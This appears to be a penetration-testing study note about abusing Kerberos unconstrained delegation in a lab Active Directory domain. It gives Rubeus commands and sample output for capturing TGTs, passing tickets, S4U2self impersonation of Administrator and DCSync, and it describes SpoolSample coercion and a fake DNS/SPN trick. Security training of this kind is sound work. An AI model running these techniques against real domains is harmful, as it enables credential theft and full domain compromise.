# Main Idea of Attack
We are waiting users or forcing computers to authenticate to us, that enable us to extract the TGT ticket that would be used in whatever we want to. 

# Key prerequisites 
(what you need to exploit)
you  need one of these:
- **Control of the machine process or machine account** that is trusted for unconstrained delegation (i.e., **administrative** or SYSTEM access to the server where users authenticate), **or**
- **Control of the service account credentials** in case the SPN is registered to a domain account (and you can act as that account on the host).

# UnConstrained Delegation types
- Computers unconstriand Delegation
- Users unconstrained Delegation

---
## Computers unconstriand Delegation
**Attack Targets**:
- **Target Domain cotrollers, so you can do `DCsync` attack.**
- **Target other computers in AD, so you can access other services to elevate your privileges**

### Targeting DC
If conditions are meet and then a Domain Administrator subsequently logs in, we will be able to extract their TGT and use it to move laterally and compromise other machines, including Domain Controllers. [Rubeus](https://github.com/GhostPack/Rubeus) is the go-to tool for this attack. As a local administrator, Rubeus can be run to monitor stored tickets. If a TGT is found within a TGS ticket, Rubeus will display it to us.
```powershell
.\Rubeus.exe monitor /interval:5 /nowrap
```

A few moments later, `Sarah Lafferty` connects to the compromised server. Rubeus retrieves Sarah's copy of the TGT that was embedded in her TGS ticket and displays it to us encoded in base64
```powershell
[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs

[*] 8/14/2020 11:06:40 AM UTC - Found new TGT:

  User                  :  sarah.lafferty@INLANEFREIGHT.LOCAL
  StartTime             :  8/14/2020 4:06:37 AM
  EndTime               :  8/14/2020 2:06:37 PM
  RenewTill             :  8/21/2020 4:06:37 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFmTCCBZWgAwIBBaEDAgEWooIEgjCCBH5hggR6MIIEdqADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggQsMIIEKKADAgESoQMCAQKiggQaBIIEFr7cTE+mYOQsYF69H0dnaQwX2Iy/dB0k91uEBGQh/Dk0lm12PzkVgX<SNIP>
```

So we will use this TGT to access the Domain Controller's `CIFS` service, for example. The `/ptt` option/flag is used to pass the received ticket into memory so that it can be used for future requests.
```powershell
.\Rubeus.exe asktgs /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /service:cifs/dc01.INLANEFREIGHT.local /ptt
```
Once we have the TGS or the TGT we can effectively list the contents of the Domain Controller file system as shown in the following command.
```
dir \\dc01.inlanefreight.local\c$
```

we can also use the [renew action](https://github.com/GhostPack/Rubeus#renew) to get a brand new TGT instead of a TGS ticket:
```powershell
.\Rubeus.exe renew /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /ptt
```


We could also get a TGS ticket for the `LDAP` service and ask for synchronization with the DC to get all the users' password hashes.

Use [SpoolSample PoC](https://github.com/leechristensen/SpoolSample) or `coarce` to force other computers to authenticate to you, so you can extract the hash.

### Target other computers/users
Other computers can't do DCsync, but they are valuble objects that we should give attention to. We can request their TGS to access other resources in AD.

If the target computer is not a domain controller, or if we want to execute attacks other than `DCSync`, we can use `S4U2self` to obtain a Service Ticket on behalf of any user we want to impersonate.
With the ticket captured from `DC01` using `Rubeus monitor` and `SpoolSample` we can use `Rubeus s4u /self` to forge a service ticket for any service. Let's create a ticket to connect through SMB using the `CIFS` service. We will need to use `Rubeus s4u /self`, set the alternative service to `CIFS`, and use the ticket we have:
```powershell
.\Rubeus.exe s4u /self /nowrap /impersonateuser:Administrator /altservice:CIFS/dc01.inlanefreight.local /ptt /ticket:doIFZjCCBWKgAwIBBaEDAgEWooIEWTCCB<SNIP>
```

---
## Users unconstrained Delegation

### Enumeration
```
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

distinguishedname     : CN=sqldev,OU=Service Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
objectclass           : {top, person, organizationalPerson, user}
name                  : sqldev
objectsid             : S-1-5-21-2974783224-3764228556-2640795941-1110
serviceprincipalname  : MSSQL_svc_dev/inlanefreight.local:1443
```
### Exploit
This attack aims to create a DNS record that will point to our attack machine. This DNS record will be a fake computer in the Active Directory environment. Once this DNS record is registered, we will add the SPN `CIFS/our_dns_record` to the account we compromised, which is in an unconstrained delegation. So, if a victim tries to connect via SMB to our fake machine, it will ship a copy of its TGT in its TGS ticket since it will ask for a ticket for `CIFS/our_registration_dns`. This TGS ticket will be sent to the IP address we chose when registering the DNS record, i.e., our attack machine. All we have to do then is extract the TGT and use it.